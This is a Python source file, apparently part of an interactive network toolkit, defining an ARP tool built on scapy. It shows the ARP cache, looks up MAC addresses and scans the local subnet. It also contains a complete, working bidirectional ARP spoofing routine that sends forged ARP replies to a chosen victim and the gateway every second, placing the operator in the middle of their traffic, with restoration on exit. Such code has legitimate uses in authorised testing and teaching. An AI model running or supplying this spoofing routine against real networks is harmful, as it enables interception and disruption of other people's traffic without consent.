import os, time
import scapy.all as scapy
from scapy.all import Ether, ARP, srp, send
from scapy.interfaces import NetworkInterface

from .utils import *
from .interface import NF_Interface


class NF_ARPTool:
    def __init__(self, interface: NetworkInterface): 
        self.interface = interface

    #========================= MENUS =========================#

    def menu(self) -> None:
        def print_menu():
            selected = self.interface.description if self.interface else 'not selected'
            selected = str_fixed_len(selected, 52)
            info = ''
            if self.interface:
                network = NF_Interface.get_network_address_with_cidr(self.interface)
                gateway = NF_Interface.get_gateway_address(self.interface)
                info = '\n |   Network: {:18}      Gateway: {:15}       |'.format(
                    network if network else 'no network', gateway if gateway else 'no gateway'
                )
            print(f'''
 +-------------------------------------------------------------------+
 |                         < ARP Tool Menu >                         |
 +-------------------------------------------------------------------+
 |   Interface: {selected} |{info}
 +-------------------------------------------------------------------+
 |                                                                   |
 |   (1) Show ARP Cache Table         (2) IP to MAC Address          |
 |                                                                   |
 |   (3) ARP Scanning                 (4) ARP Spoofing               |
 |                                                                   |
 |   (0) Back to Main Menu                                           |
 |                                                                   |
 +-------------------------------------------------------------------+\n''')

        print_menu()
        while True:
            try:
                i = input('[?] Enter menu number : ')
            except KeyboardInterrupt:
                print()
                break
            print()

            if i == '1':
                self.show_arp_cache_table()
            elif i == '2':
                ip = input('[?] Enter a IP address : ').strip()
                print()
                if not is_valid_ipv4(ip):
                    print('[-] IP address entered is invalid.\n')
                else:
                    self.get_mac_address_by_ip(ip, verbose=True)
                    print()
            elif i == '3':
                self.arp_scan()
                print()
            elif i == '4':
                self.arp_spoof()
                print()
            elif i == '0':
                break
            else:
                continue

            try:
                input('[?] Press enter key to back to menu. ')
            except KeyboardInterrupt:
                print()
            print_menu()

    #========================= FUNCS =========================#

    def get_manufacturer_by_mac(self, mac: str) -> str:
        result = scapy.conf.manufdb._get_manuf(mac)
        if result == mac:
            return 'unknown device'
        return result


    def show_arp_cache_table(self) -> None:
        if is_windows():
            print('[*] Retrieving ARP cache table of selected interface...')

            run_powershell(f'Get-NetNeighbor -AddressFamily IPv4 -InterfaceIndex {self.interface.index}' + '''
                | Sort-Object -Property IPAddress
                | Where-Object {$_.State -ne 'Unreachable'}''', hide_output=False)
        else:
            os.system('arp -a')
            print()


    def get_mac_address_by_ip(self, ip: str, verbose: bool = False) -> str | None:
        if verbose: print(f'[*] Finding which device has {ip}...')
        
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, iface=self.interface, verbose=0)
        if len(ans) == 0:
            if verbose: print('[-] Device not found. Please check the IP.')
            return None

        mac = ans[0][1][ARP].hwsrc # [0]=first packet, [1]=recv
        if verbose: print(f'[+] Device has been found with "{mac}" ({self.get_manufacturer_by_mac(mac)})')
        return mac


    def arp_scan(self) -> None:
        network = NF_Interface.get_network_address_with_cidr(self.interface)
        if not network:
            print('[-] Could not obtain network address. Scanning aborted.')
            return
        
        print(f'[*] Starting the ARP scanning to {network}...')
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=2, iface=self.interface, verbose=0)

        print('\n{:15}   {:17}   {}'.format('IPv4', 'MAC', 'Manufacturer (OUI)'))
        print('=' * 80)
        for s, r in sorted(ans, key=lambda x: scapy.atol(x[1][ARP].psrc)):
            ip  = r[ARP].psrc
            mac = r[ARP].hwsrc # r[Ether].src
            oui = str_fixed_len(self.get_manufacturer_by_mac(mac), 42).strip()
            print('{:15}   {:17}   {}'.format(ip, mac, oui))
        print('=' * 80)
        
        print('\n[+] ARP scan completed.')


    def arp_spoof(self, target_ip: str | None = None, gateway_ip: str | None = None):
        try:
            if not gateway_ip:
                default_ip = NF_Interface.get_gateway_address(self.interface)
                gateway_ip = input(f'[?] Enter Gateway IP {f"({default_ip}) " if default_ip else ""}: ').strip()
                if gateway_ip == '': gateway_ip = default_ip
            if not target_ip:
                target_ip = input('[?] Enter Target IP : ').strip()
        except KeyboardInterrupt:
            print()
            return
        
        if not is_valid_ipv4(gateway_ip):
            print('\n[-] Gateway IP is invalid.')
            return
        if not is_valid_ipv4(target_ip):
            print('\n[-] Target IP is invalid.')
            return

        gateway_mac = self.get_mac_address_by_ip(gateway_ip)
        target_mac  = self.get_mac_address_by_ip(target_ip)
        if not gateway_mac or not target_mac:
            print('\n[-] MAC address not found. Stop spoofing.')
            return
        
        print('''
 +---------------------+                         +---------------------+
 |   Gateway (Router)  |                         |   Target (Victim)   |
 +---------------------+         BLOCKED         +---------------------+
 |   {:^15}   |     <---- (X) ---->     |   {:^15}   |
 |  {:17}  |                         |  {:17}  |
 | {:^19} |                         | {:^19} |
 +---------------------+                         +---------------------+
 
        ^                +---------------------+                ^
        |                |    You (Attacker)   |                |
        +------------    +---------------------+    ------------+
         I'm target!     |   {:^15}   |    I'm gateway!
                         |  {:17}  |
                         +---------------------+\n'''.format(
            gateway_ip, target_ip, gateway_mac, target_mac,
            str_fixed_len(self.get_manufacturer_by_mac(gateway_mac), 19).strip(),
            str_fixed_len(self.get_manufacturer_by_mac(target_mac), 19).strip(),
            self.interface.ip, self.interface.mac))

        print('[*] Packet forwarding is required to see packets going to and from the target.')
        print('[*] Packet forwarding can be enabled in the interface menu.\n')

        print('[*] Set gateway and target\'s MAC to static in ARP table for this computer.')
        ret1 = self.add_static_arp_cache(gateway_ip, gateway_mac)
        ret2 = self.add_static_arp_cache(target_ip, target_mac)
        if not ret1 or not ret2:
            print('[-] Failed to change ARP table.')
            print('[-] Please retry with root or administrator privilege.')
            self.remove_arp_cache(gateway_ip)
            self.remove_arp_cache(target_ip)
            return

        def get_mac(ip):
            return target_mac if ip == target_ip else gateway_mac
        
        def spoof(target_ip, spoof_ip):
            packet = ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
            # send(packet, iface=self.interface, verbose=0)
            r = scapy.sendp(Ether(dst=get_mac(target_ip))/packet, iface=self.interface, verbose=0)

        def restore(src_ip, dst_ip):
            packet = ARP(op=2, pdst=dst_ip, hwdst=get_mac(dst_ip), psrc=src_ip, hwsrc=get_mac(src_ip))
            send(packet, iface=self.interface, verbose=0)

        print(f'[*] Starting the bidirectional ARP spoofing...')
        print('[*] To stop ARP spoofing, press Ctrl+C keys.\n')
        sent_count = 0
        try:
            while True:
                spoof(target_ip, gateway_ip)
                spoof(gateway_ip, target_ip)
                sent_count += 2
                print('\r[*] Packets Sent: ' + str(sent_count), end='')
                time.sleep(1) # Wait for a second
        except KeyboardInterrupt:
            print('\n\n[!] Ctrl+C pressed!')

        print('[*] Removing gateway and target\'s static MAC cache from this computer...')
        if not self.remove_arp_cache(gateway_ip) or not self.remove_arp_cache(target_ip):
            print('[-] Failed to remove gateway\'s MAC from ARP table.')

        print('[*] Restoring ARP tables of target and gateway...\n')
        sent_count = 0
        for _ in range(5):
            restore(gateway_ip, target_ip)
            restore(target_ip, gateway_ip)
            sent_count += 2
            print('\r[*] Packets Sent: ' + str(sent_count), end='')
            time.sleep(0.5)

        print('\n\n[+] ARP spoof stopped.')



    def add_static_arp_cache(self, ip: str, mac: str) -> bool:
        self.remove_arp_cache(ip)
        if is_windows():
            return run_powershell(f'''New-NetNeighbor
                -InterfaceIndex {self.interface.index}
                -IPAddress "{ip}"
                -LinkLayerAddress "{mac.replace(':', '-')}"
                -State Permanent''')
        elif is_linux():
            print('[-] Currently Linux is not supported.')
        elif is_macos():
            print('[-] Currently MacOS is not supported.')
        else:
            print('[-] Unknown operating system.')
        return False


    def remove_arp_cache(self, ip: str) -> bool:
        if is_windows():
            return run_powershell(f'''Remove-NetNeighbor
                    -InterfaceIndex {self.interface.index}
                    -IPAddress "{ip}"
                    -Confirm:$false''')
        elif is_linux():
            print('[-] Currently Linux is not supported.')
        elif is_macos():
            print('[-] Currently MacOS is not supported.')
        else:
            print('[-] Unknown operating system.')
        return False



